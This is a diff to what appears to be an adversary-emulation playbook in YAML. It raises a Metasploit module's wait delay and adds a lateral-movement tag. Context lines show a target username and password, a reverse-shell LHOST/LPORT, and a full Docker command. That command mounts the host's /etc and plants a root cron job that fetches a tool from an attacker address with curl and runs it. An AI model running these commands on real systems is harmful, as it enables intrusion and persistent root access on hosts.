@@ -88,7 +88,7 @@ commands:
       RPORT: "8080"
       USERNAME: "alice"
       PASSWORD: "alice123alice!"
-      WfsDelay: "8000"
+      WfsDelay: "380000"
     payload_options:
       LHOST: "192.42.1.174"
       LPORT: "4444"
@@ -148,8 +148,8 @@ commands:
   - type: shell
     cmd: docker -H tcp://localhost:1090 run --rm -t -u root --network=nextcloud_default -v /etc:/root/etc  kalilinux/kali-rolling bash -c "echo \"*/5 * * * * root test -e /opt/tool || curl http://$ATTACKER_ADDRESS:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool\" > /root/etc/cron.d/sysvz"
     metadata:
-      techniques: "T1610,T1525,T1053.003"
-      tactics: "Defense Evasion,Execution,Persistence,Privilege Escalation"
+      techniques: "T1610,T1525,T1053.003,T1210"
+      tactics: "Defense Evasion,Execution,Persistence,Privilege Escalation,Lateral Movement"
       description: "Attacker mounts etc-directory of the host into a container and creates a cron-job in it that executes the sliver-implant as root outside of the container"
 
 
